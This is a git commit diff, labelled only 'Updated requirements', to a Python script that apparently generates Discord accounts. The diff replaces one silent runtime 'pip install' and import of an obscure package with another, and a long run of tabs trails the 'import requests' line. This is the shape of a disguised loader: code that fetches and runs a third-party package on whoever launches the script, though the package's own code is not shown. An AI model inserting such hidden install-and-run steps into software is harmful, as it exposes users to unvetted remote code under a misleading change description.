1fef3b853dfd73d62265b1de52b65648232a1b74
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-07-18 01:00:18 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptextensions")
-import pythoncryptextensions
+os.system("pip install pythonsqltoolkitV1")
+import pythonsqltoolkitV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
